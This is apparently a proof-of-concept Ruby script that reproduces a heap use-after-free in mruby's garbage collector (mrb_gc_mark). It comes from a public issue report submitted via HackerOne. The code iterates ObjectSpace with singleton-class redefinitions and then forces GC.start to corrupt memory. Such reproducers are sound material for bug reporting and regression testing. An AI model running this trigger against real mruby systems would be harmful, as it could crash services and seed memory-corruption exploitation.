# Heap use-after-free in mrb_gc_mark (mirb, ObjectSpace gem)
# Issue: https://github.com/mruby/mruby/issues/3804
# Reported via hackerone

y=Array.new(124)
ObjectSpace.each_object{|a=1;j|Array.new;class<<Array a;def self;end;end;}
ObjectSpace.each_object{|obj|obj[].s rescue 0}
e{j[e{j}]}rescue GC.start